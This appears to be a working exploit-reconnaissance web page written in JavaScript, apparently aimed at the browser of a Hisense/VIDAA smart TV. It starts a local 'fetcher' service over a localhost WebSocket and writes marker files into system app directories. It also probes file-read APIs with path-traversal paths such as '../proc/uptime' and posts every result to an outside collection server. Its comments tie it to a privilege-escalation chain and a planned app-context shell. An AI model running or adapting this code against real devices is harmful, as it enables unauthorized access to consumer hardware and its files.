<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>recon-fetcher</title>
<style>
  html, body { margin: 0; padding: 0; background: #000; color: #ccc; }
  #out { font: 18px/1.4 Menlo, Consolas, monospace; white-space: pre-wrap;
         word-break: break-all; padding: 10px; }
  .ok { color: #8f8; } .err { color: #f88; } .warn { color: #fd6; } .hdr { color: #6cf; }
</style>
</head>
<body>
<div id="out"></div>
<script>
/*
 * recon-fetcher.html — re-verify the 75U8QTUK "fetcher" conclusion.
 *
 * The 2026-11-06 findings/04 probe used HiUtils_createRequest("fileRead" /
 * "fileWrite") and never started the basic/fetcher FaaS service. The 100U7Q
 * chain's write primitive is a different surface:
 *
 *   1. start basic/fetcher over wss://localhost:9888
 *      {path:"phoenix://service/basic/fetcher", method:"start"}
 *   2. vowOS.service.syncExecute("basic/fetcher",
 *        {api:"fetchFile", args:JSON.stringify({url,directory,permission})})
 *
 * This page starts the service, attempts two benign marker writes (one to
 * /APPS, one to the package CHA dir the chain needs), then re-runs the
 * hiutils read matrix with the path shapes used by the working 100U7Q/a6q
 * records (bare string vs one-element array vs /APPS-relative).
 *
 * WRITE SURFACE: two marker files only, no install, no postinst, no reboot.
 * Markers:
 *   /APPS/.recon_fetcher_marker
 *   /APPS/pkgs/tv.vidaa.jsservice.basic/CHA/.recon_fetcher_marker
 * Teardown: delete both with an app-context shell once one exists.
 */
(function () {
  "use strict";

  var OUT = document.getElementById("out");
  var FALLBACK_BASE = "http://10.0.0.157:8770";
  var BASE = /^https?:$/.test(location.protocol) ? location.origin : FALLBACK_BASE;
  var SRC = BASE + "/recon-captures/marker.txt";
  var MARKERS = [
    "/APPS/.recon_fetcher_marker",
    "/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/.recon_fetcher_marker"
  ];
  var READ_PATHS = ["../var/local/otaTest.log", "../proc/uptime", "websdk/Appinfo.json"];

  var rep = {
    started: new Date().toISOString(),
    page: location.href,
    ua: navigator.userAgent,
    env: {},
    serviceStart: [],
    writes: [],
    reads: [],
    finished: null
  };

  function trunc(s, n) {
    s = String(s == null ? "" : s);
    return s.length > n ? s.slice(0, n) + "…(" + s.length + ")" : s;
  }
  function js(v) {
    try { return trunc(JSON.stringify(v), 600); }
    catch (e) { return trunc(String(v), 600); }
  }
  function line(text, cls) {
    var d = document.createElement("div");
    d.textContent = text;
    if (cls) d.className = cls;
    OUT.appendChild(d);
    window.scrollTo(0, document.body.scrollHeight);
  }
  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  function post(tag) {
    var body = JSON.stringify({ tag: tag, at: new Date().toISOString(), report: rep });
    try {
      fetch(BASE + "/api/recon", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: body
      }).catch(function () {
        try {  // no-CORS fallback: delivery is best-effort, screen has the data
          fetch(BASE + "/api/recon", { method: "POST", mode: "no-cors", body: body });
        } catch (e) {}
      });
    } catch (e) {}
  }

  function detectEnv() {
    rep.env.vowOS = typeof vowOS;
    rep.env.vowOSService = (typeof vowOS !== "undefined" && vowOS && vowOS.service)
      ? typeof vowOS.service.syncExecute : "(absent)";
    rep.env.HiUtils_createRequest = typeof HiUtils_createRequest;
    rep.env.WebSDK_createFileRequest = typeof WebSDK_createFileRequest;
    try {
      rep.env.hisenseFns = Object.keys(window).filter(function (k) {
        return k.indexOf("Hisense_") === 0;
      }).length;
    } catch (e) { rep.env.hisenseFns = "err"; }
  }

  function wsStart(scheme) {
    return new Promise(function (resolve) {
      var ws, done = false;
      function fin(o) {
        if (done) return;
        done = true;
        try { if (ws) ws.close(); } catch (e) {}
        resolve(o);
      }
      try { ws = new WebSocket(scheme + "://localhost:9888"); }
      catch (e) { return fin({ scheme: scheme, error: String(e) }); }
      ws.onopen = function () {
        try {
          ws.send(JSON.stringify({
            path: "phoenix://service/basic/fetcher", method: "start",
            parameters: {}, session: 901, timeout: 10
          }));
        } catch (e) {}
        setTimeout(function () { fin({ scheme: scheme, opened: true, sent: true }); }, 1400);
      };
      ws.onerror = function () { fin({ scheme: scheme, opened: false, error: "ws error" }); };
      ws.onclose = function () { fin({ scheme: scheme, opened: false, error: "closed before open" }); };
      setTimeout(function () { fin({ scheme: scheme, opened: false, error: "timeout" }); }, 6000);
    });
  }

  function vow(svc, payload) {
    if (typeof vowOS === "undefined" || !vowOS || !vowOS.service ||
        typeof vowOS.service.syncExecute !== "function") {
      return { skipped: "vowOS.service.syncExecute absent" };
    }
    try {
      var r = vowOS.service.syncExecute(svc, payload);
      return { ret: (r && typeof r === "object") ? r.ret : undefined,
               msg: trunc(r && r.msg !== undefined ? r.msg : r, 500) };
    } catch (e) { return { exc: String(e) }; }
  }

  function postSvc(base, svc, payload, ms) {
    return new Promise(function (resolve) {
      var ctrl = (typeof AbortController === "function") ? new AbortController() : null;
      var timer = setTimeout(function () { if (ctrl) ctrl.abort(); }, ms || 4000);
      function done(o) { clearTimeout(timer); resolve(o); }
      try {
        fetch(base + "/service/" + svc, {
          method: "POST",
          headers: { "Content-Type": "application/json", "identifier": "" },
          body: JSON.stringify(payload),
          signal: ctrl ? ctrl.signal : undefined
        }).then(function (r) {
          r.text().then(function (t) {
            done({ status: r.status, text: trunc(t, 500) });
          }).catch(function (e) { done({ status: r.status, textError: String(e) }); });
        }).catch(function (e) {
          done({ fetchError: e && e.name ? e.name + ": " + e.message : String(e) });
        });
      } catch (e) { done({ exc: String(e) }); }
    });
  }

  function isOk(r) {
    if (!r) return false;
    if (r.ret === true) return true;
    if (typeof r.text === "string" && /"ret"\s*:\s*true/.test(r.text)) return true;
    if (typeof r.msg === "string" && /"ret"\s*:\s*true/.test(r.msg)) return true;
    return false;
  }

  async function writeTests() {
    line("-- fetcher fetchFile writes --", "hdr");
    for (var i = 0; i < MARKERS.length; i++) {
      var target = MARKERS[i];
      var args = { url: SRC, directory: target, permission: 420 };
      var variants = [
        { name: "vow-args-string", call: function () {
            return Promise.resolve(vow("basic/fetcher",
              { api: "fetchFile", args: JSON.stringify(args) }));
          } },
        { name: "vow-args-object", call: function () {
            return Promise.resolve(vow("basic/fetcher",
              { api: "fetchFile", args: args }));
          } },
        { name: "http-9888-object", call: function () {
            return postSvc("https://localhost:9888", "basic/fetcher",
              { api: "fetchFile", args: args });
          } },
        { name: "http-9009-object", call: function () {
            return postSvc("http://localhost:9009", "basic/fetcher",
              { api: "fetchFile", args: args });
          } }
      ];
      for (var v = 0; v < variants.length; v++) {
        var r = await variants[v].call();
        var rec = { target: target, variant: variants[v].name, result: r, ok: isOk(r) };
        rep.writes.push(rec);
        var cls = rec.ok ? "ok" : (r && (r.fetchError || r.exc)) ? "err" : "warn";
        line("[" + (rec.ok ? "OK" : "--") + "] " + target + " via " + rec.variant +
             " -> " + js(r), cls);
        post("write");
        if (rec.ok) break;
      }
    }
  }

  async function readTests() {
    line("-- hiutils fileRead matrix (why findings/04 saw invalid path) --", "hdr");
    for (var p = 0; p < READ_PATHS.length; p++) {
      var path = READ_PATHS[p];
      var forms = [
        { name: "HiUtils_createRequest-string", call: function () {
            if (typeof HiUtils_createRequest !== "function") return Promise.resolve({ skipped: "absent" });
            try {
              var r = HiUtils_createRequest("fileRead", { path: path, mode: 6 });
              return Promise.resolve({ ret: r && r.ret, msg: trunc(r && r.msg, 300) });
            } catch (e) { return Promise.resolve({ exc: String(e) }); }
          } },
        { name: "HiUtils_createRequest-array", call: function () {
            if (typeof HiUtils_createRequest !== "function") return Promise.resolve({ skipped: "absent" });
            try {
              var r = HiUtils_createRequest("fileRead", { path: [path], mode: 6 });
              return Promise.resolve({ ret: r && r.ret, msg: trunc(r && r.msg, 300) });
            } catch (e) { return Promise.resolve({ exc: String(e) }); }
          } },
        { name: "vow-path-string", call: function () {
            return Promise.resolve(vow("hiutils", { api: "fileRead", args: { mode: 6, path: path } }));
          } },
        { name: "vow-path-array", call: function () {
            return Promise.resolve(vow("hiutils", { api: "fileRead", args: { mode: 6, path: [path] } }));
          } },
        { name: "http-9009-path-string", call: function () {
            return postSvc("http://localhost:9009", "hiutils",
              { api: "fileRead", args: { path: path, mode: 6 } });
          } },
        { name: "http-9009-path-array", call: function () {
            return postSvc("http://localhost:9009", "hiutils",
              { api: "fileRead", args: { path: [path], mode: 6 } });
          } }
      ];
      for (var f = 0; f < forms.length; f++) {
        var r = await forms[f].call();
        var rec = { path: path, form: forms[f].name, result: r, ok: isOk(r) };
        rep.reads.push(rec);
        var cls = rec.ok ? "ok" : (r && (r.fetchError || r.exc)) ? "err" : "warn";
        line("[" + (rec.ok ? "OK" : "--") + "] read " + path + " via " + rec.form +
             " -> " + js(r), cls);
      }
    }
  }

  async function main() {
    line("== alvidaa recon-fetcher ==", "hdr");
    line(rep.ua);
    line("marker source: " + SRC);
    detectEnv();
    line("env: " + js(rep.env));
    post("start");

    line("-- starting basic/fetcher over WS 9888 --", "hdr");
    var a = await wsStart("wss");
    rep.serviceStart.push(a);
    line("[" + (a.opened ? "OK" : "--") + "] wss://localhost:9888 -> " + js(a),
         a.opened ? "ok" : "warn");
    if (!a.opened) {
      var b = await wsStart("ws");
      rep.serviceStart.push(b);
      line("[" + (b.opened ? "OK" : "--") + "] ws://localhost:9888 -> " + js(b),
           b.opened ? "ok" : "err");
    }
    post("started");
    await sleep(1200);

    await writeTests();
    await readTests();

    rep.finished = new Date().toISOString();
    post("final");
    line("== done — screenshot this page ==", "hdr");
  }

  main().catch(function (e) {
    line("FATAL " + String(e), "err");
    rep.fatal = String(e);
    post("fatal");
  });
})();
</script>
</body>
</html>
